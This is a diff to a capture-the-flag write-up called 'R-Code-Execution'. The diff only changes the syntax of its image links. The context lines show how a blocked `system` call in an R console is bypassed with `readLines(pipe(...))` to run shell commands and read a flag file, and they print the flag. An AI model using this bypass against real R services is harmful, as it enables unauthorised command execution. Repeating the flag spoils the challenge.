@@ -4,7 +4,7 @@ title: R-Code-Execution
 ---
 In this challenge we simply get R console.
 
-![[Pasted image 20260310215443.png]]
+![Pasted image 20260310215443.png](./images/images/Pasted image 20260310215443.png)
 
 I tried to use the functions `system` and `system2`, both gave me the same message:
 ```
@@ -24,7 +24,7 @@ This is the shorter payload, without the `con` object:
 readLines(pipe("id"))
 ```
 
-![[Pasted image 20260310215629.png]]
+![Pasted image 20260310215629.png](./images/images/Pasted image 20260310215629.png)
 
 Okay, now let's look for `.passwd`
 
@@ -36,6 +36,6 @@ So, our final payload:
 readLines(pipe("cat /home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt"))
 ```
 
-![[Pasted image 20260310223913.png]]
+![Pasted image 20260310223913.png](./images/images/Pasted image 20260310223913.png)
 
 and the flag is **C0nGr47ul4T10n_y0u_ll_H4v3_A_G00d_Gr4D3**
